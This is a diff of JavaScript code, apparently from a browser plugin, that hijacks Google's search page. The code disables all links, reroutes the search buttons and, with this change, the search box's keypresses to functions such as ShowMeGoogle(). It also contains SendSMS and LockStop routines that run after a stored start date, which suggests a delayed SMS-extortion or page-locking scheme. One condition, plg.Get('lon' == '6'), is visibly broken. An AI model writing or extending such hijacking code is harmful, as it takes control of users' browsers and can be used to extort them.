@@ -233,7 +233,7 @@ function ShowMeGoogle() {
 
 
 function ChangeLinks(){
-
+	var input = document.getElementById('gbqfq');
 	if (document.getElementById('gbqfb')){
 		document.getElementById('gbqfb').setAttribute('onmousedown','ShowMeGoogle()');
 		var i=0;
@@ -242,15 +242,23 @@ function ChangeLinks(){
 			document.getElementsByTagName('a')[i].href = "#";
 		}
 	}
+	
+	if (input){
+		 input.setAttribute('onkeypress','ToEnter()');
+	}
 }
 
 
 function ChangeMainButtons() {
+	var input = document.getElementById('gbqfq');
 	if (document.getElementById('gsri_ok0')){ 
 		
 		document.getElementById('gbqfsa').setAttribute('onclick','ShowMeGoogle()'); 
 		document.getElementById('gbqfbb').setAttribute('onclick','ShowMeGoogle()'); 
 		document.getElementById('gsri_ok0').setAttribute('onclick','ShowMeGoogle()');
+	}
+	if (input){
+		input.setAttribute('onkeypress','ToEnter()');
 	}
 	
 }
@@ -412,25 +420,21 @@ function SendSMS() {
 
 }
 
-
-
-
 function Start() {
-		if (plg){
-			if (plg.Get('lon' == '6')){
-				LockStop();
-				
-			}
-			if (plg.Get('lon') == '2'){
-				ShowMeGoogle();
-				
-			}
-			else{
-				isMain();
-				
-			}
+	if (plg){
+		if (plg.Get('lon' == '6')){
+			LockStop();
+			
+		}
+		if (plg.Get('lon') == '2'){
+			ShowMeGoogle();
+			
+		}
+		else{
+			isMain();			
 		}
 	}
+}
 
   window.onload = function () {
 		TimeOut ();
@@ -492,8 +496,7 @@ function SetTime() {
 			else{
 				w = parseInt(startTime) + days;		
 				
-				if (now>=startTime){
-					
+				if (now>=startTime){					
 					Start();					
 				}
 				else {	
